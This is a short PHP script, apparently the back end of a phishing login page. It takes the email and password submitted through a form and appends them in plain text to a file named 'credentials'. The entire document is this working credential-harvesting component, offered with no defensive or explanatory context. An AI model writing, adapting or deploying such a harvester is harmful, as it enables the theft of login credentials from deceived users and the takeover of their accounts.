<?php
$mail=$_POST['email'];
$pass=$_POST['pass'];
$input="Username:" . $mail . " Password:" . $pass . "\n";
$credentialFile = fopen('credentials','a+');
fwrite($credentialFile, $input);
fclose($credentialFile);
?>
